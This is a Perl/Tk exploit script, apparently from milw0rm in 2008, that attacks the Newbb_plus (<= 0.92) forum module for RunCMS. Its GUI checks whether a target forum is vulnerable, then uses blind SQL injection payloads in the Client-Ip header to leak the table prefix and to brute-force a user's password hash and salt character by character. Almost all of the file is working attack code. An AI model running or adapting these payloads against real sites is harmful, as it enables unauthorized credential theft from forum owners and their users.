@@ -1,0 +1,228 @@
+#!/usr/bin/perl
+
+	use Tk;
+	use Tk::BrowseEntry;
+	use Tk::DialogBox;
+	use LWP::UserAgent;
+
+	$mw = new MainWindow(title => "UnderWHAT?!" );
+
+	$mw->geometry ( '420x383' ) ;
+	$mw->resizable(0,0);
+
+	$mw->Label(-text => '', -font => '{Verdana} 8',-foreground=>'red')->pack();
+	$mw->Label(-text => 'Newbb_plus <= 0.92 Client Ip Sql Injection', -font => '{Tahoma} 7 bold',-foreground=>'red')->pack();
+	$mw->Label(-text => 'it will take about half an hour to get hashed password', -font => '{Tahoma} 7 bold',-foreground=>'red')->pack();
+	$mw->Label(-text => 'you need magic_quotes_gpc turned off and mysql version higher that 4.1', -font => '{Tahoma} 7 bold',-foreground=>'red')->pack();
+	$mw->Label(-text => '', -font => '{Tahoma} 7 bold',-foreground=>'red')->pack();
+
+
+	$fleft  = $mw->Frame()->pack ( -side => 'left', -anchor => 'ne') ;
+	$fright = $mw->Frame()->pack ( -side => 'left', -anchor => 'nw') ;
+
+	$url      = 'http://test2.ru/runcms/modules/newbb_plus/';
+	$user_id  = '1';
+	$prefix   = 'run_';
+	$table    = 'users';
+	$column   = 'user_password';
+	$report   = '';
+	$group    = 1;
+	$curr_user = 0;
+	
+
+
+	$fleft->Label ( -text => 'Path to forum index: ', -font => '{Verdana} 8 bold') ->pack ( -side => "top" , -anchor => 'e' ) ;
+	$fright->Entry ( -relief => "groove", -width => 35, -font => '{Verdana} 8', -textvariable => \$url) ->pack ( -side => "top" , -anchor => 'w' ) ;
+
+	$fleft->Label ( -text => 'User ID: ', -font => '{Verdana} 8 bold' ) ->pack ( -side => "top" , -anchor => 'e' ) ;
+	$fright->Entry ( -relief => "groove", -width => 35, -font => '{Verdana} 8', -textvariable => \$user_id) ->pack ( -side => "top" , -anchor => 'w' ) ;
+
+	$fleft->Label ( -text => 'Database tables prefix: ', -font => '{Verdana} 8 bold') ->pack ( -side => "top" , -anchor => 'e' ) ;
+	$fright->Entry ( -relief => "groove", -width => 35, -font => '{Verdana} 8', -textvariable => \$prefix) ->pack ( -side => "top" , -anchor => 'w' ) ;
+
+	$fleft->Label ( -text => 'Returned hash: ', -font => '{Verdana} 8 bold') ->pack ( -side => "top" , -anchor => 'e' ) ;
+	$fright->Entry ( -relief => "groove", -width => 35, -font => '{Verdana} 8', -textvariable => \$report) ->pack ( -side => "top" , -anchor => 'w' ) ;
+
+	$fleft->Label ( -text => 'Returned salt: ', -font => '{Verdana} 8 bold') ->pack ( -side => "top" , -anchor => 'e' ) ;
+	$fright->Entry ( -relief => "groove", -width => 35, -font => '{Verdana} 8', -textvariable => \$salt) ->pack ( -side => "top" , -anchor => 'w' ) ;
+
+	$fright->Label( -text => ' ')->pack();
+
+	$fright->Button(-text    => 'Test forum vulnerability',
+	                -relief => "groove",
+	                -width => '30',
+	                -font => '{Verdana} 8 bold',
+	                -activeforeground => 'red',
+	                -command => \&test_vuln
+	               )->pack();
+
+	$fright->Button(-text    => 'Get database tables prefix',
+	                -relief => "groove",
+	                -width => '30',
+	                -font => '{Verdana} 8 bold',
+	                -activeforeground => 'red',
+	                -command => \&get_prefix
+	               )->pack();
+	
+	$fright->Button(-text    => 'Get hash from database',
+	                -relief => "groove",
+	                -width => '30',
+	                -font => '{Verdana} 8 bold',
+	                -activeforeground => 'red',
+	                -command => \&get_hash
+	               )->pack();
+				   
+	$fright->Button(-text    => 'Get salt from database',
+	                -relief => "groove",
+	                -width => '30',
+	                -font => '{Verdana} 8 bold',
+	                -activeforeground => 'red',
+	                -command => \&get_salt
+	               )->pack();
+				   
+	$mw   ->Label(-text => '', -font => '{Verdana} 7 bold',-foreground=>'red')->pack();
+	$fleft->Label(-text => '!', -font => '{Webdings} 22')->pack();
+	$fleft->Label(-text => 'Newbb_plus 0.92', -font => '{Verdana} 7 bold',-foreground=>'red')->pack();
+	$fleft->Label(-text => 'client ip sql injection ', -font => '{Verdana} 7 bold',-foreground=>'red')->pack();
+	$fleft->Label(-text => 'mysql char bruteforcing ', -font => '{Verdana} 7 bold',-foreground=>'red')->pack();
+	$fleft->Label(-text => 'bug in replace function ', -font => '{Verdana} 7 bold',-foreground=>'red')->pack();
+	$fleft->Label(-text => 'by gemaglabin and Elekt  ', -font => '{Verdana} 7 bold',-foreground=>'red')->pack();
+	$fleft->Label(-text => '( mafia of antichat.ru ) ', -font => '{Verdana} 7 bold',-foreground=>'red')->pack();
+	$fleft->Label(-text => ' 2007.02.04 ( fixed ) ', -font => '{Verdana} 7 bold',-foreground=>'red')->pack();
+	$fright->Label(-text => '', -font => '{Verdana} 3 bold',-foreground=>'red')->pack();
+	$print=$fright->Text(-width=>35,-height=>5,-wrap=>"word")->pack(-side=>"top",-anchor=>"s");
+	
+	MainLoop();
+	
+	sub get_hash()
+	{
+		srand();
+		$xpl = LWP::UserAgent->new( ) or die;
+		$InfoWindow=$mw->DialogBox(-title   => 'get hash from database', -buttons => ["OK"]);
+		$i = 1;
+		$b = 0;
+		$report = '';
+		$type = get_type();
+		if ($type == 0) {$len = 40;}
+		if ($type == 1) {$len = 32;}
+		my ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime(time);
+		$print->insert('end',"- Start [$hour:$min:$sec]\n");
+		my @brutearray=qw(48 49 50 51 52 53 54 55 56 57 58 97 98 99 100 101 102);
+		while (length($report)<$len)
+		{
+			$num = $brutearray[$b];
+			$ret = get_pchar();
+			if($ret > 0)
+			{
+				$print->insert('end',"- char [$num] = ".chr($num)."\n");
+				$report .= chr($num);
+				$b = 0;
+				$i = $i +1;
+				$mw->update(); 
+				break;
+			}
+			else
+			{
+				$b = $b +1;
+			}
+		}
+		my ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime(time);
+		$print->insert('end',"- Finish [$hour:$min:$sec]");
+	}
+	
+	sub get_salt()
+	{
+		srand();
+		$xpl = LWP::UserAgent->new( ) or die;
+		$InfoWindow=$mw->DialogBox(-title   => 'get salt from database', -buttons => ["OK"]);
+		$i = 1;
+		$b = 0;
+		$salt = '';
+		my ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime(time);
+		$print->insert('end',"- Start [$hour:$min:$sec]\n");
+		my @brutearray=qw(33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126);
+		while (length($salt)<4)
+		{
+			$num = $brutearray[$b];
+			$ret = get_schar();
+			if($ret > 0)
+			{
+				$print->insert('end',"- char [$num] = ".chr($num)."\n");
+				$salt .= chr($num);
+				$b = 0;
+				$i = $i +1;
+				$mw->update(); 
+				break;
+			}
+			else
+			{
+				$b = $b +1;
+			}
+		}
+		my ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime(time);
+		$print->insert('end',"- Finish [$hour:$min:$sec]");
+	}
+	
+	sub get_pchar()
+	{
+		$res = $xpl->get($url,'Client-Ip'=>"123' or 1=if(ascii(substring((select pass from ".$prefix."users where uid=$user_id),$i,1))=$num,0,(select 1 union select 5))/*");
+		if($res->as_string =~ /DELETE FROM/i) { return 0;}
+		if($res->as_string =~ /INSERT INTO/i) { return 1;}
+	}
+	
+	sub get_type()
+	{
+		$res = $xpl->get($url,'Client-Ip'=>"123' or 1=if(ascii(substring((select pwdsalt from ".$prefix."users where uid=$user_id),1,1))=0,0,(select 1 union select 5))/*");
+		if($res->as_string =~ /DELETE FROM/i) { return 0;}
+		if($res->as_string =~ /INSERT INTO/i) { return 1;}
+	}
+	
+	sub get_schar()
+	{
+		$res = $xpl->get($url,'Client-Ip'=>"123' or 1=if(ascii(substring((select pwdsalt from ".$prefix."users where uid=$user_id),$i,1))=$num,0,(select 1 union select 5))/*");
+		if($res->as_string =~ /DELETE FROM/i) { return 0;}
+		if($res->as_string =~ /INSERT INTO/i) { return 1;}
+	}
+	
+	 
+	sub test_vuln()
+	{
+		$xpl = LWP::UserAgent->new( ) or die;
+		$res = $xpl->get($url,'Client-Ip'=>"123' or 1=if(ascii(1)=49,0,(select 1 union select 5))/*");
+		if($res->is_success) 
+		{
+			$rep = '';
+			if($res->as_string =~ /INSERT/i || $res->as_string =~ /DELETE/i) 
+			{ 
+				if($res->as_string =~ /INSERT/i)
+				{$print->insert('end',"- FORUM VULNERABLE\n");}
+				else { $print->insert('end',"- FORUM IS EMPTY\n");}
+			}
+			else { $print->insert('end',"- FORUM UNVULNERABLE\n");} 
+		}
+	}
+
+	sub get_prefix()
+	{
+		$InfoWindow=$mw->DialogBox(-title   => 'get database tables prefix', -buttons => ["OK"]);
+		$InfoWindow->add('Label', -text => '', -font => '{Verdana} 8')->pack;
+		$InfoWindow->add('Label', -text => $url, -font => '{Verdana} 8')->pack;
+		$InfoWindow->add('Label', -text => '', -font => '{Verdana} 8')->pack;
+		$xpl = LWP::UserAgent->new( ) or die;
+		$res = $xpl->get($url,'Client-Ip'=>"' union 1=1/*");
+		if($res->is_success) 
+		{
+			$rep = '';
+			if($res->as_string =~ /FROM (.*)bbplus/) { $prefix = $1; $InfoWindow->add('Label', -text => 'Prefix: '.$prefix, -font => '{Verdana} 8 bold')->pack; }
+			else { $InfoWindow->add('Label', -text => 'Can\'t get prefix', -font => '{Verdana} 8 bold',-foreground=>'red')->pack; } 
+		}
+		else
+		{
+			$InfoWindow->add('Label', -text => 'Error!', -font => '{Verdana} 8 bold',-foreground=>'red')->pack;
+			$InfoWindow->add('Label', -text => $res->status_line, -font => '{Verdana} 8')->pack;
+		} 
+		$InfoWindow->Show();
+		$InfoWindow->destroy;   
+	}
+
+# milw0rm.com [2008-01-06]
